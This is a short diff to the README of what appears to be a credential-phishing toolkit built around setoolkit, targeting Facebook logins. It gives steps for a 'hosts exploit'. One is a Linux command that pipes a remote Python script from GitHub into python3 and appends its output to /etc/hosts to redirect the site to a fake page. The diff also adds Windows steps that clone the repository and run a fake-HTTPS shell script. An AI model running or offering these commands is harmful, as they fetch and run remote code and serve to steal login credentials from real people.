@@ -19,13 +19,16 @@ $ pip install -r requirements.txt
 setoolkit
 ```
 
-3. - Creating hosts exploit
+3. - Creating hosts exploit facebook.bgr
 - For Linux
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
 ```
 - For Windows
 ```
+git clone https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials.git 
+cd SSTC-HTTPS-login-credentials/sh1mazu_https_fake
+bash sh1m@zu.sh
 ```
 
 
